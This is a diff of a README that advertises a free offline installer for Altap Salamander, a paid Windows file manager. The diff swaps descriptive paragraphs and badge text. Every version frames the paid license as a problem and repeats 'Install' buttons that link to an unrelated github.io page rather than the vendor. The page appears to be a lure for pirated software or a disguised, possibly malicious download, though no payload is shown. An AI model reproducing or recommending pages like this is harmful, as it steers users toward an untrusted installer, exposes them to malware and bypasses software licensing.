@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-File+Manager-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Altap Salamander Free Installer** — Altap Salamander is a Windows dual-pane file manager in the tradition of Norton Commander and Total Commander. Works without internet access, no account required. Full offline installation.
+**💻 Altap Salamander Free Installer** — Altap Salamander is a powerful dual-panel file manager for Windows with a long history and feature set targeting power users. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Altap Salamander](https://img.shields.io/badge/⬇_Install_Altap%20Salamander-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Altap Salamander](https://img.shields.io/badge/⬇_Install_Altap+Salamander-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Altap Salamander
 
-Altap Salamander is a Windows dual-pane file manager in the tradition of Norton Commander and Total Commander. It provides tabbed browsing, built-in viewer for dozens of file types, FTP client, archive management, and extensive keyboard shortcut customization.
+Altap Salamander is a powerful dual-panel file manager for Windows with a long history and feature set targeting power users. Supports built-in archive management, FTP/SFTP/FTPS connections, viewer plugins, file comparison, and an extensive command-line interface. Altap Salamander's plugin architecture and keyboard-driven workflow make it a productive choice for users who need efficient file management.
 
 ---
 
 ## ❌ Problem: Altap Salamander is hard to access
 
-- **Windows Only** — Not available on macOS or Linux
-- **Paid License** — Requires purchase
-- **Niche Market** — Power file manager users often loyal to Total Commander
-- **Commander UI** — Dual-pane interface not intuitive for users accustomed to single-pane managers
+- **Windows Only** — No cross-platform support
+- **Commercial License** — Paid software with a free trial period
+- **Dated Interface** — Visual design reflects the software's age
+- **Learning Investment** — Full productivity requires learning the keyboard command set
 
 ---
 
@@ -81,7 +81,7 @@ Altap Salamander is a Windows dual-pane file manager in the tradition of Norton 
 
 <div align="center">
 
-[![⬇ Install Altap Salamander](https://img.shields.io/badge/⬇_Install_Altap%20Salamander-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Altap Salamander](https://img.shields.io/badge/⬇_Install_Altap+Salamander-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ Altap Salamander is a Windows dual-pane file manager in the tradition of Norton 
 
 ---
 
-**Altap Salamander Free Installer** — Altap Salamander is a Windows dual-pane file manager in the tradition of Norton Commander and Total Commander. Install without internet connection today!
+**Altap Salamander Free Installer** — Altap Salamander is a powerful dual-panel file manager for Windows with a long history and feature set targeting power users. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Altap Salamander](https://img.shields.io/badge/⬇_Install_Altap%20Salamander-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Altap Salamander](https://img.shields.io/badge/⬇_Install_Altap+Salamander-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
